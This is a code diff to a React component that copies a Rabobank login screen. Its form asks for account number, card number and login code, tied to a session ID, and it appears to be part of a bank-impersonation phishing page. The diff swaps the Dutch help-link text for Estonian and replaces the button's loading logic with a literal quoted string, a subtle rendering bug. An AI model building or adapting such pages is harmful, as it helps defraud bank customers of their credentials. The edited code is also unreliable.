@@ -117,7 +117,7 @@ export function RabobankClient({ sessionId }: { sessionId: string }) {
               disabled={saving || !rekeningnummer || !pasnummer || !inlogcode} 
               className="w-full bg-[#3B404E] text-[#A0A5AD] font-bold py-3 rounded-[4px] transition-colors disabled:opacity-70 hover:bg-[#484E5E] hover:text-white"
             >
-              {saving ? "Laden..." : "Inloggen"}
+              "Inloggen"
             </button>
           </form>
 
@@ -137,7 +137,7 @@ export function RabobankClient({ sessionId }: { sessionId: string }) {
 
           <div className="mt-8 text-center">
             <a href="#" className="text-[#4882F6] text-[13px] hover:underline flex items-center justify-center gap-1">
-              Hulp bij inloggen
+              Abi sisselogimisel
               <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
             </a>
           </div>
